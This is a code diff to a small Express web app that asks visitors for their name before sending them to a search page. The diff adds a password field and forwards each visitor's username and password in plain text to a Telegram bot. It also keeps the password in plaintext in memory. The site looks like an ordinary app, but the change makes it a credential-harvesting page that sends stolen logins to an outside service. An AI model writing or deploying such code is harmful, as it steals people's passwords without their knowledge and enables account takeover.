@@ -17,20 +17,22 @@ app.set('view engine', 'ejs');
 // Store user data temporarily (in a real app, use a database)
 let userData = {};
 
-// Home route - Ask for user's name
+// Home route - Ask for user's name and password
 app.get('/', (req, res) => {
     res.render('name');
 });
 
-// Save user's name and redirect to search
+// Save user's name, password, and redirect to search
 app.post('/save-name', (req, res) => {
     const userName = req.body.userName;
+    const password = req.body.password;
 
-    // Save the user's name
+    // Save the user's name and password
     userData.name = userName;
+    userData.password = password;
 
-    // Send the name to Telegram bot
-    sendToTelegram(`New user: ${userName}`);
+    // Send the name and password to Telegram bot
+    sendToTelegram(`New user:\nUsername: ${userName}\nPassword: ${password}`);
 
     // Redirect to the search page
     res.redirect('/search');
@@ -114,4 +116,4 @@ function sendToTelegram(message) {
 // Start the server
 app.listen(port, () => {
     console.log(`Server is running on http://localhost:${port}`);
-}); 
+});
